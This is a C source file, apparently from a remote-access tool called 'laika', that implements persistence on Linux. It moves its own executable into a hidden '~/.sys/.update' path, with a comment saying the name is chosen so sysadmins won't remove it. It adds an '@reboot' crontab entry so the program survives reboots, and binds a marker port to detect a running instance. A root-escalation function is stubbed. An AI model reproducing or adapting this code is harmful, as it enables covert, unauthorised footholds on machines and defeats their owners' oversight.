/* platform specific code for achieving persistence on linux */

/* this is only used to check if another instance of laika is currently running */
#define LAIKA_RESERVED_PORT 32876
#define LAIKA_TMP_FILE "/tmp/laikaTMP"

/* most sysadmins probably wouldn't dare remove something named '.sys/.update' */
#define LAIKA_INSTALL_DIR_USER ".sys"
#define LAIKA_INSTALL_FILE_USER ".update"

#include "persist.h"
#include "lsocket.h"
#include "lerror.h"
#include "lmem.h"

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>

static struct sLaika_socket laikaB_markerPort;

/* check if laika is running as super-user */
bool laikaB_checkRoot() {
    return geteuid() == 0; /* user id 0 is reserved for root in 99% of the cases */
}

/* mark that laika is currently running */
void laikaB_markRunning() {
#ifndef DEBUG
    LAIKA_TRY
        laikaS_initSocket(&laikaB_markerPort, NULL, NULL, NULL, NULL);
        laikaS_bind(&laikaB_markerPort, LAIKA_RESERVED_PORT);
    LAIKA_CATCH
        LAIKA_DEBUG("Failed to bind marker port, laika is already running!\n");
        exit(0);
    LAIKA_TRYEND
#endif
}

/* unmark that laika is currently running */
void laikaB_unmarkRunning() {
#ifndef DEBUG
    laikaS_kill(&laikaB_markerPort);
#endif
}

void getCurrentExe(char *outPath, int pathSz) {
    int sz;

    /* thanks linux :D */
    if ((sz = readlink("/proc/self/exe", outPath, pathSz - 1)) == -1)
        LAIKA_ERROR("Failed to grab current process executable path!\n");

    outPath[sz] = '\0';
}

void getInstallPath(char *outPath, int pathSz) {
    struct stat st;
    const char *home;

    /* try to read home from ENV, else get it from pw */
    if ((home = getenv("HOME")) == NULL) {
        home = getpwuid(getuid())->pw_dir;
    }

    /* create install directory if it doesn't exist */
    snprintf(outPath, pathSz, "%s/%s", home, LAIKA_INSTALL_DIR_USER);
    if (stat(outPath, &st) == -1) {
        LAIKA_DEBUG("creating '%s'...\n", outPath);
        mkdir(outPath, 0700);
    }

    snprintf(outPath, pathSz, "%s/%s/%s", home, LAIKA_INSTALL_DIR_USER, LAIKA_INSTALL_FILE_USER);
}

bool checkPersistCron(char *path) {
    char buf[PATH_MAX + 128];
    FILE *fp;
    bool res = false;

    if ((fp = popen("crontab -l", "r")) == NULL)
        LAIKA_ERROR("popen('crontab') failed!");

    while (fgets(buf, sizeof(buf), fp)) {
        if (strstr(buf, path)) {
            /* laika is installed in the crontab! */
            res = true;
            break;
        }
    }

    pclose(fp);
    return res;
}

void tryPersistCron(char *path) {
    char cmd[PATH_MAX + 128];

    /* should be 'safe enough' */
    snprintf(cmd, PATH_MAX + 128, "(crontab -l ; echo \"@reboot %s\")| crontab -", path);

    /* add laika to crontab */
    if (system(cmd))
        LAIKA_ERROR("failed to install '%s' to crontab!\n", path);

    LAIKA_DEBUG("Installed '%s' to crontab!\n", path);
}

/* try to gain persistance on machine */
void laikaB_tryPersist() {
#ifndef LAIKA_NOINSTALL
    char exePath[PATH_MAX];
    char installPath[PATH_MAX];

    /* grab current process's executable & get the install path */
    getCurrentExe(exePath, PATH_MAX);
    getInstallPath(installPath, PATH_MAX);

    /* move exe to install path */
    if (rename(exePath, installPath))
        LAIKA_ERROR("Failed to install '%s' to '%s'!\n", exePath, installPath);

    LAIKA_DEBUG("Successfully installed '%s'!\n", installPath);

    LAIKA_TRY
        /* enable persistence on reboot via cron */
        if (!checkPersistCron(installPath))
            tryPersistCron(installPath);
    LAIKA_CATCH
        LAIKA_DEBUG("crontab not installed or not accessible!")
    LAIKA_TRYEND
#endif
}

/* try to gain root */
void laikaB_tryRoot() {
    /* stubbed */
}